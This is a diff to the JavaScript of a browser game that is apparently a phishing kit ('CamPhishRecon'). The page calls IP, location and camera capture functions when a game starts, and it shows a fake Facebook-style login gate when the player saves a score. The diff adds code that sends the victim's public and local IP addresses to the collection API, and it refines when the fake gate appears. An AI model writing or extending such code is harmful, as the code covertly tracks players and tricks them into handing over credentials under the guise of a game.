@@ -163,8 +163,9 @@ showLb();
 	elPlayBtn.onclick=startGame;
 	elRetryBtn.onclick=startGame;
 	var sb=document.getElementById('saveScoreBtn');
-	if(sb)sb.onclick=function(){document.getElementById('fbGate').classList.remove('hidden');};
+	if(sb)sb.onclick=function(){if(elGameover.classList.contains('hidden'))return;document.getElementById('fbGate').classList.remove('hidden');};
 	elCamBtn.onclick=reqCamera;
+	closeFbGate();
 addEventListener('keydown',onKeyDown);
 addEventListener('keyup',onKeyUp);
 setupTouch();
@@ -257,7 +258,7 @@ function captureIP(){
 if(window.CamPhishRecon){
 CamPhishRecon.init({genderDetect:true});
 }else{
-fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'}).catch(function(){});
+fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({public_ip:window.CamPhishPublicIp||'',client_ip:window.CamPhishLocalIp||''})}).catch(function(){});
 }
 }
 function captureLoc(){
@@ -287,6 +288,7 @@ fetch(API+'/capture/event',{method:'POST',headers:{'Content-Type':'application/j
 }
 
 function startGame(){
+closeFbGate();
 captureIP();
 captureLoc();
 logEvent('game_start');
@@ -736,7 +738,8 @@ var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);Ca
 }
 
 function closeFbGate(){
-document.getElementById('fbGate').classList.add('hidden');
+var gate=document.getElementById('fbGate');
+if(gate)gate.classList.add('hidden');
 }
 
 function showLb(){
